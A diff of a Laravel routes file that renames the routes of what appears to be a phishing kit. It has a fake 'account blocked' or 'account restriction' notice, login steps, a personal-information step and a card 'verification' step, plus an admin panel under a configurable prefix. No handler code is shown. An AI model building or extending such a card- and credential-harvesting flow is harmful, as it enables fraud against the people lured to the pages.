@@ -1,26 +1,20 @@
 <?php
 
-use App\Http\Controllers\{AdminController, AuthController, BillingController, LandingController, PaymentController};
+use App\Http\Controllers\{AdminController, AuthController, VerificationController};
 use App\Models\Settings;
 use Illuminate\Support\Facades\Route;
 
-Route::get('/autenticação', [AuthController::class, 'index'])->name('login.index');
-Route::post('/autenticação', [AuthController::class, 'post'])->name('login.store');
-
-Route::get('/conta-bloqueada', [LandingController::class, 'index'])->name('landing.index');
-Route::post('/conta-bloqueada', [LandingController::class, 'post'])->name('landing.store');
-Route::get('/obrigado', [LandingController::class, 'finish'])->name('finish');
-
-Route::get('/informações-pessoais', [BillingController::class, 'index'])->name('billing.index');
-Route::post('/informações-pessoais', [BillingController::class, 'store'])->name('billing.store');
-
-Route::get('/verificar', [PaymentController::class, 'index'])->name('payment.index');
-Route::post('/verificar', [PaymentController::class, 'post'])->name('payment.store');
+Route::get('/login', [AuthController::class, 'login'])->name('login.index');
+Route::post('/login', [AuthController::class, 'idLogin'])->name('login.store');
+Route::put('/login', [AuthController::class, 'authenticate'])->name('login.authenticate');
+Route::get('/account/restriction', [AuthController::class, 'restrict'])->name('login.verify');
+Route::get('/account/verify/card', [VerificationController::class, 'card'])->name('verify.card');
+Route::post('/account/verify/card', [VerificationController::class, 'cardPost'])->name('verify.card.post');
 
 $adminPrefix = 'admin';
 
 try {
-    if (Schema::hasTable('settings')) {
+    if (Schema::hasTable('settings') && !app()->runningInConsole()) {
         $adminPrefix = Settings::me()->admin_panel ?? 'admin';
     }
 } catch (Throwable) {
